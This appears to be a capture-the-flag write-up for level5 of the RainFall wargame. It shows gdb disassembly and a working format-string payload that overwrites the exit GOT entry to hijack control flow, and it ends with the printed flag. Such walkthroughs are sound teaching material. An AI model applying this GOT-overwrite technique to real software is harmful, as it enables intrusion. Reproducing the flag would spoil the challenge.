### Exploit

```
    level5@RainFall:~$ python -c 'print "\x48\x98\x04\x08" + "%4$p"' | ./level5
    H0x8049848
```

```
    (gdb) disas n
    Dump of assembler code for function n:
    0x080484c2 <+0>:	push   ebp
    0x080484c3 <+1>:	mov    ebp,esp
    0x080484c5 <+3>:	sub    esp,0x218
    0x080484cb <+9>:	mov    eax,ds:0x8049848
    0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
    0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
    0x080484dc <+26>:	lea    eax,[ebp-0x208]
 => 0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
    0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
    0x080484ea <+40>:	lea    eax,[ebp-0x208]
    0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
    0x080484f3 <+49>:	call   0x8048380 <printf@plt>
    0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
    End of assembler dump.
```

```
    (gdb) disas 0x80483d0
    Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
    0x080483d6 <+6>:	push   0x28
    0x080483db <+11>:	jmp    0x8048370
    End of assembler dump.
```
We found a jump!

```
    level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/payload
    level5@RainFall:~$ cat /tmp/payload - | ./level5
    [...]
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
